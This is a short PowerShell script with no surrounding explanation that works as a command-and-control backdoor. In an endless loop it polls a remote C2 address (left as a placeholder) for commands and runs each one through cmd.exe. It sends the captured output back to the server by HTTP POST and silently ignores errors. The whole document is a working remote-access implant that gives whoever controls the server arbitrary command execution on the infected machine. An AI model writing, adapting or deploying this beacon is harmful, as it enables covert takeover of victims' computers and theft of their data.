$c2 = 'RENDER_URL_PLACEHOLDER'
while($true) {
    try {
        $r = (Invoke-WebRequest -Uri "$c2/getcmd" -UseBasicParsing).Content | ConvertFrom-Json
        if ($r.cmd) {
            $p = New-Object System.Diagnostics.Process
            $p.StartInfo.FileName = 'cmd.exe'
            $p.StartInfo.Arguments = '/c ' + $r.cmd
            $p.StartInfo.UseShellExecute = $false
            $p.StartInfo.RedirectStandardOutput = $true
            $p.StartInfo.RedirectStandardError = $true
            $p.Start() | Out-Null
            $o = $p.StandardOutput.ReadToEnd() + $p.StandardError.ReadToEnd()
            Invoke-WebRequest -Uri "$c2/result" -Method POST -Body (@{output=$o} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
        }
    } catch {}
    Start-Sleep -Seconds 3
}
